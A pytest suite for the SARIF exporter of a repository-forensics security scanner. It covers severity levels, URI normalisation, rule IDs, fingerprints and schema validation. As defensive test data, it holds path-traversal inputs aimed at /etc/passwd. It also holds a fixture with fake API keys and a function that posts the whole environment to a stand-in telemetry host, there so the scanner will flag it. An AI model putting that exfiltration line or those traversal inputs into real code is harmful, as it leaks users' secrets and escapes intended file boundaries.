"""test_sarif_export.py - SARIF 2.1.0 converter tests.

Covers the mapping table in design §1.2-1.4:
  - severity -> level truth table (incl. info -> note, unknown -> note)
  - line=0 -> no region; line>0 -> startLine == line; never startLine: 0
  - Windows-style file -> forward-slashed relative URI
  - empty rule_id -> rf/<scanner>/<category-slug>; correlation -> rf/correlation/...
  - rules[] dedup + sorted; every result.ruleId resolves in driver.rules
  - fingerprint stability: same finding at line 10 vs 40 -> identical
    findingId and stableLocationV1; two occurrences of same rule+file ->
    distinct stableLocationV1 (occurrence index)
  - suppressed findings -> suppressions[0].kind == "external"
  - schema validation (importorskip jsonschema, Draft7)
  - TOOL_VERSION == .claude-plugin/plugin.json version

Vendored schema provenance (refinement #3):
  source URL: https://json.schemastore.org/sarif-2.1.0.json
  (the OASIS SARIF 2.1.0 JSON Schema; the raw oasis-tcs GitHub URL 404'd at
  vendor time, schemastore is the canonical GitHub code-scanning mirror and
  matches the $schema key emitted in output)
  sha256: 7c9688f0a1c4a4e1649ecc78521087e664729c1dff56ee8212ff195c7b16132a
  declared $schema: http://json-schema.org/draft-07/schema#  -> Draft7Validator
"""

import json
import os
import pathlib
import subprocess
import sys

import pytest

_TESTS_DIR = pathlib.Path(__file__).parent
_SCRIPTS_DIR = _TESTS_DIR.parent / "scripts"
_REPO_ROOT = _TESTS_DIR.parent
_SCHEMA_PATH = _TESTS_DIR / "schemas" / "sarif-schema-2.1.0.json"

if str(_SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS_DIR))

import sarif_export  # noqa: E402


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _finding(scanner="secrets", severity="high", title="T", description="D",
             file="a/b.py", line=10, snippet="x = 1", category="secret",
             rule_id="SC-KEY-001", confidence=0.95, finding_id="abc123",
             attacker="", boundary="", asset="", evidence_class="direct",
             freshness_status="", original_severity=""):
    return {
        "scanner": scanner, "severity": severity, "title": title,
        "description": description, "file": file, "line": line,
        "snippet": snippet, "category": category, "rule_id": rule_id,
        "confidence": confidence, "attacker": attacker, "boundary": boundary,
        "asset": asset, "freshness_status": freshness_status,
        "evidence_class": evidence_class, "finding_id": finding_id,
        "original_severity": original_severity,
    }


def _report(findings, suppressed=None, target="/tmp/x", mode="full",
            exit_code=2, summary=None, core_verdict=None):
    return {
        "target": target, "mode": mode,
        "scanner_count": 1, "scanners": [],
        "summary": summary or {"critical": 0, "high": 0, "medium": 0, "low": 0, "total": 0},
        "verdicts": {}, "exit_code": exit_code,
        "findings": list(findings),
        "suppressed": list(suppressed or []),
        "coverage_status": {}, "core_verdict": core_verdict or {"tier": "block"},
        "enrichment_status": {}, "capability_ledger": {},
    }


def _results(report):
    return sarif_export.report_to_sarif(report)["runs"][0]["results"]


def _rules(report):
    return sarif_export.report_to_sarif(report)["runs"][0]["tool"]["driver"]["rules"]


# ---------------------------------------------------------------------------
# Severity -> level truth table
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("severity,expected", [
    ("critical", "error"),
    ("high", "error"),
    ("medium", "warning"),
    ("low", "note"),
    ("info", "note"),
    ("unknown", "note"),
    ("", "note"),
])
def test_severity_to_level(severity, expected):
    f = _finding(severity=severity, rule_id="SC-KEY-001")
    out = _results(_report([f]))
    assert out[0]["level"] == expected


# ---------------------------------------------------------------------------
# line=0 -> no region; line>0 -> startLine; never startLine < 1
# ---------------------------------------------------------------------------

def test_line_zero_omits_region():
    f = _finding(line=0, snippet="evidence")
    res = _results(_report([f]))[0]
    phys = res["locations"][0]["physicalLocation"]
    assert "region" not in phys
    # snippet still carried in properties when no region
    assert res["properties"]["snippet"] == "evidence"


def test_line_positive_sets_startline():
    f = _finding(line=42, snippet="ev")
    res = _results(_report([f]))[0]
    region = res["locations"][0]["physicalLocation"]["region"]
    assert region["startLine"] == 42
    assert region["snippet"]["text"] == "ev"


def test_no_startline_below_one():
    # Defensive: even a malformed line=0 must never produce startLine: 0.
    f = _finding(line=0)
    res = _results(_report([f]))[0]
    phys = res["locations"][0]["physicalLocation"]
    assert "region" not in phys or phys["region"].get("startLine", 0) >= 1


# ---------------------------------------------------------------------------
# Windows-style file -> forward-slashed relative URI (platform-aware)
# ---------------------------------------------------------------------------

def test_windows_path_normalized():
    f = _finding(file="src\\sub\\a.py", line=5)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    if os.sep == "\\":
        # Windows: native separator converted to `/`.
        assert uri == "src/sub/a.py"
        assert "\\" not in uri
        assert uri == os.path.relpath(os.path.join("src", "sub", "a.py"), ".") \
            or uri == "src/sub/a.py"
    else:
        # POSIX: backslash is a literal data char, percent-encoded as %5C.
        # No phantom directory is synthesized from the backslashes.
        assert uri == "src%5Csub%5Ca.py"
        assert "/" not in uri
        assert ".." not in uri


def test_windows_separator_branch_forced(monkeypatch):
    """Exercise the Windows os.sep branch on ANY platform.

    `_normalize_uri` is pure string logic gated on `os.sep`, so forcing
    `os.sep == '\\'` fully validates the Windows behavior even on a POSIX
    runner (where the platform-conditional test above never enters it).
    Guarantees the cross-platform separator handling is covered every run.
    """
    monkeypatch.setattr(sarif_export.os, "sep", "\\")
    n = sarif_export._normalize_uri
    # native separator is converted to `/`
    assert n("dir\\sub\\file.py") == "dir/sub/file.py"
    # traversal via native separators is guarded, never escapes SRCROOT
    esc = n("..\\..\\etc\\passwd.txt")
    assert ".." not in esc.split("/")
    assert not esc.startswith("/")
    # embedded traversal falls back to the bare basename
    assert n("a\\b\\..\\..\\..\\c.txt") == "c.txt"


# ---------------------------------------------------------------------------
# Torture A-1/A-2: literal backslash stays literal; no `..` traversal URI
# ---------------------------------------------------------------------------

def test_backslash_filename_stays_literal_posix():
    # A-1: `back\slash file.txt` must NOT become `back/slash file.txt` (a
    # phantom directory). On POSIX the backslash is a literal data char.
    f = _finding(file="back\\slash file.txt", line=1)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    if os.sep == "\\":
        # Windows: backslash is the separator -> forward slash; space -> %20.
        assert uri == "back/slash%20file.txt"
    else:
        # POSIX: backslash literal -> %5C; space -> %20; no phantom dir.
        assert uri == "back%5Cslash%20file.txt"
        assert "/" not in uri
    # No phantom directory on either platform when there is no real slash.
    if os.sep != "\\":
        assert "back/slash" not in uri


def test_backslash_traversal_never_yields_dotdot_uri():
    # A-2: `..\..\etc\passwd.txt` must NEVER produce a `..` path URI that
    # could escape SRCROOT. On POSIX the backslashes are literal (%5C), so
    # there is no real `/` traversal. On Windows the backslashes convert to
    # `/` and the traversal guard clamps to the bare basename.
    f = _finding(file="..\\..\\etc\\passwd.txt", line=1)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    # Hard invariant: no `../` segment may ever appear in the emitted URI.
    assert "../" not in uri
    # No path component may equal `..`.
    assert ".." not in uri.split("/")
    # No leading slash (absolute) and no scheme.
    assert not uri.startswith("/")
    assert "://" not in uri


def test_real_dotdot_traversal_clamped_to_basename():
    # A genuine forward-slash `..` traversal must be clamped, never emitted.
    f = _finding(file="../../etc/passwd.txt", line=1)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert "../" not in uri
    assert ".." not in uri.split("/")
    assert not uri.startswith("/")
    # Leading `../` stripped -> `etc/passwd.txt` (still within SRCROOT).
    assert uri == "etc/passwd.txt"


def test_deep_repo_relative_path_preserved():
    # A genuinely deep repo-relative path is preserved verbatim (percent-
    # encoded only where needed; slashes kept).
    f = _finding(file="src/deep/nested/module/file.py", line=12)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert uri == "src/deep/nested/module/file.py"
    assert ".." not in uri.split("/")
    assert not uri.startswith("/")


def test_artifact_uri_is_relative():
    f = _finding(file="a/b.py", line=1)
    res = _results(_report([f]))[0]
    uri = res["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
    assert not os.path.isabs(uri)
    assert "uriBaseId" in res["locations"][0]["physicalLocation"]["artifactLocation"]


# ---------------------------------------------------------------------------
# Empty rule_id -> synthesized rf/<scanner>/<category-slug>
# ---------------------------------------------------------------------------

def test_empty_rule_id_synthesized():
    f = _finding(rule_id="", scanner="correlation", category="exfiltration")
    res = _results(_report([f]))[0]
    assert res["ruleId"] == "rf/correlation/exfiltration"


def test_meta_scanner_synthesized():
    f = _finding(rule_id="", scanner="meta", category="configuration")
    res = _results(_report([f]))[0]
    assert res["ruleId"] == "rf/meta/configuration"


def test_pack_rule_id_preserved():
    f = _finding(rule_id="SC-KEY-001")
    res = _results(_report([f]))[0]
    assert res["ruleId"] == "SC-KEY-001"


# ---------------------------------------------------------------------------
# rules[] dedup + sorted; referential integrity
# ---------------------------------------------------------------------------

def test_rules_dedup_and_sorted():
    findings = [
        _finding(rule_id="SC-KEY-002", category="secret"),
        _finding(rule_id="SC-KEY-001", category="secret"),
        _finding(rule_id="SC-KEY-001", category="secret"),  # dup
    ]
    rules = _rules(_report(findings))
    ids = [r["id"] for r in rules]
    assert ids == sorted(set(ids))
    assert ids == ["SC-KEY-001", "SC-KEY-002"]


def test_every_result_ruleid_in_driver_rules():
    findings = [
        _finding(rule_id="SC-KEY-001"),
        _finding(rule_id="", scanner="correlation", category="exfiltration"),
        _finding(rule_id="", scanner="meta", category="configuration"),
    ]
    sarif = sarif_export.report_to_sarif(_report(findings))
    rule_ids = {r["id"] for r in sarif["runs"][0]["tool"]["driver"]["rules"]}
    for res in sarif["runs"][0]["results"]:
        assert res["ruleId"] in rule_ids


def test_rule_ids_unique():
    findings = [_finding(rule_id="SC-KEY-001"), _finding(rule_id="SC-KEY-001")]
    rules = _rules(_report(findings))
    ids = [r["id"] for r in rules]
    assert len(ids) == len(set(ids))


def test_levels_in_valid_set():
    findings = [
        _finding(severity="critical"), _finding(severity="medium"),
        _finding(severity="low"), _finding(severity="info"),
    ]
    sarif = sarif_export.report_to_sarif(_report(findings))
    for res in sarif["runs"][0]["results"]:
        assert res["level"] in {"error", "warning", "note", "none"}


# ---------------------------------------------------------------------------
# Fingerprint stability
# ---------------------------------------------------------------------------

def test_fingerprint_stable_across_line_drift():
    f1 = _finding(line=10, finding_id="abc123")
    f2 = _finding(line=40, finding_id="abc123")
    r1 = _results(_report([f1]))[0]
    r2 = _results(_report([f2]))[0]
    assert r1["partialFingerprints"]["repoForensics/findingId"] == \
        r2["partialFingerprints"]["repoForensics/findingId"]
    assert r1["partialFingerprints"]["repoForensics/stableLocationV1"] == \
        r2["partialFingerprints"]["repoForensics/stableLocationV1"]


def test_distinct_occurrences_get_distinct_stable_location():
    # Two occurrences of the same rule+file must NOT share stableLocationV1.
    f1 = _finding(rule_id="SC-KEY-001", file="config.py", snippet="key1", line=1)
    f2 = _finding(rule_id="SC-KEY-001", file="config.py", snippet="key2", line=2)
    out = _results(_report([f1, f2]))
    locs = {r["partialFingerprints"]["repoForensics/stableLocationV1"] for r in out}
    assert len(locs) == 2


# ---------------------------------------------------------------------------
# Suppressed findings -> external suppression
# ---------------------------------------------------------------------------

def test_suppressed_findings_get_external_suppression():
    f = _finding(rule_id="SC-KEY-001")
    rep = _report([f], suppressed=[_finding(rule_id="SC-KEY-002", file="x.py")])
    sarif = sarif_export.report_to_sarif(rep)
    results = sarif["runs"][0]["results"]
    suppressed = [r for r in results if r.get("suppressions")]
    assert len(suppressed) == 1
    assert suppressed[0]["suppressions"][0]["kind"] == "external"
    assert "justification" in suppressed[0]["suppressions"][0]


# ---------------------------------------------------------------------------
# Top-level shape
# ---------------------------------------------------------------------------

def test_top_level_shape():
    sarif = sarif_export.report_to_sarif(_report([_finding()]))
    assert sarif["$schema"] == "https://json.schemastore.org/sarif-2.1.0.json"
    assert sarif["version"] == "2.1.0"
    assert len(sarif["runs"]) == 1
    run = sarif["runs"][0]
    drv = run["tool"]["driver"]
    assert drv["name"] == "repo-forensics"
    assert drv["version"] == sarif_export.TOOL_VERSION
    assert drv["informationUri"] == "https://github.com/alexgreensh/repo-forensics"
    assert "SRCROOT" in run["originalUriBaseIds"]
    assert run["originalUriBaseIds"]["SRCROOT"]["uri"].endswith("/")
    for key in ("mode", "exitCode", "summary", "coreVerdictTier"):
        assert key in run["properties"]


def test_srcroot_uri_uses_target():
    sarif = sarif_export.report_to_sarif(_report([_finding()], target="/tmp/repo"))
    uri = sarif["runs"][0]["originalUriBaseIds"]["SRCROOT"]["uri"]
    assert uri == "file:///tmp/repo/"


# ---------------------------------------------------------------------------
# Schema validation (skips cleanly without jsonschema)
# ---------------------------------------------------------------------------

def test_output_validates_against_sarif_schema():
    jsonschema = pytest.importorskip("jsonschema")
    schema = json.loads(_SCHEMA_PATH.read_text(encoding="utf-8"))
    # The vendored schema declares $schema draft-07 -> Draft7Validator.
    assert schema["$schema"] == "http://json-schema.org/draft-07/schema#"
    validator = jsonschema.Draft7Validator(schema)

    findings = [
        _finding(rule_id="SC-KEY-001", line=10, snippet="ev"),
        _finding(rule_id="", scanner="correlation", category="exfiltration", line=0),
    ]
    sarif = sarif_export.report_to_sarif(_report(findings, exit_code=2))
    errors = sorted(validator.iter_errors(sarif), key=lambda e: list(e.path))
    assert not errors, [list(e.path) + [e.message[:120]] for e in errors[:5]]


def test_clean_report_validates_against_sarif_schema():
    jsonschema = pytest.importorskip("jsonschema")
    schema = json.loads(_SCHEMA_PATH.read_text(encoding="utf-8"))
    validator = jsonschema.Draft7Validator(schema)
    sarif = sarif_export.report_to_sarif(_report([], exit_code=0))
    errors = sorted(validator.iter_errors(sarif), key=lambda e: list(e.path))
    assert not errors, [list(e.path) + [e.message[:120]] for e in errors[:5]]


# ---------------------------------------------------------------------------
# TOOL_VERSION pinned to .claude-plugin/plugin.json
# ---------------------------------------------------------------------------

def test_tool_version_matches_plugin_json():
    plugin_json = _REPO_ROOT.parent / ".claude-plugin" / "plugin.json"
    if not plugin_json.exists():
        # Dev checkout layout: repo root is two levels above the skill.
        plugin_json = _REPO_ROOT.parent.parent / ".claude-plugin" / "plugin.json"
    assert plugin_json.exists(), f"plugin.json not found near {_REPO_ROOT}"
    data = json.loads(plugin_json.read_text(encoding="utf-8"))
    assert sarif_export.TOOL_VERSION == data["version"]


# ---------------------------------------------------------------------------
# End-to-end via run_forensics.sh --format sarif
# ---------------------------------------------------------------------------

def _script_path():
    return str(_SCRIPTS_DIR / "run_forensics.sh")


# The run_forensics.sh entrypoint is a bash script; Windows-native Python
# cannot exec it directly (users invoke it via WSL/git-bash). The SARIF
# converter logic itself is covered cross-platform by the unit tests above,
# including the forced-os.sep Windows-branch test.
_needs_bash = pytest.mark.skipif(
    sys.platform == "win32",
    reason="run_forensics.sh entrypoint requires a bash interpreter",
)


@_needs_bash
def test_sarif_end_to_end_secrets_fixture(tmp_path):
    cfg = tmp_path / "config.py"
    # The env-copy + outbound POST keeps this fixture on the BLOCK path via a
    # REAL typed Rule 1 compound (ST-EX-007 env leaf + trifecta_raw network
    # leaf). The previous secrets-only fixture BLOCKed through a manufactured
    # correlation: the PostgreSQL URI finding's own prose ("post...", "secret")
    # satisfied both keyword sides of old Rule 1 with no network call present
    # (typed-correlation rewrite, 2026-09-20).
    cfg.write_text(
        "import os\n"
        "import requests\n"
        "\n"
        "AWS_KEY = 'AKIANY4M7KQP9XJR2E3F'\n"
        "OPENAI_KEY = 'sk-proj-1234567890abcdef'\n"
        "STRIPE_KEY = 'sk_live_abcdef1234567890'\n"
        "DB_URL = 'postgresql://user:p@ssword@localhost/db'\n"
        "\n"
        "\n"
        "def sync_telemetry():\n"
        "    requests.post(\"https://telemetry.example.com/collect\", json=dict(os.environ))\n"
    )
    result = subprocess.run(
        [_script_path(), str(tmp_path), "--format", "sarif", "--offline", "--no-vulns"],
        capture_output=True, text=True, check=False)
    assert result.returncode == 2, result.stderr
    sarif = json.loads(result.stdout)
    assert sarif["version"] == "2.1.0"
    run = sarif["runs"][0]
    assert run["tool"]["driver"]["name"] == "repo-forensics"
    rule_ids = {r["id"] for r in run["tool"]["driver"]["rules"]}
    for res in run["results"]:
        assert res["ruleId"] in rule_ids
        assert res["level"] in {"error", "warning", "note", "none"}


@_needs_bash
def test_sarif_end_to_end_clean_fixture(tmp_path):
    (tmp_path / "README.md").write_text("# Clean\n")
    (tmp_path / "main.py").write_text("print('hi')\n")
    result = subprocess.run(
        [_script_path(), str(tmp_path), "--format", "sarif", "--offline", "--no-vulns"],
        capture_output=True, text=True, check=False)
    assert result.returncode == 0, result.stderr
    sarif = json.loads(result.stdout)
    assert sarif["version"] == "2.1.0"
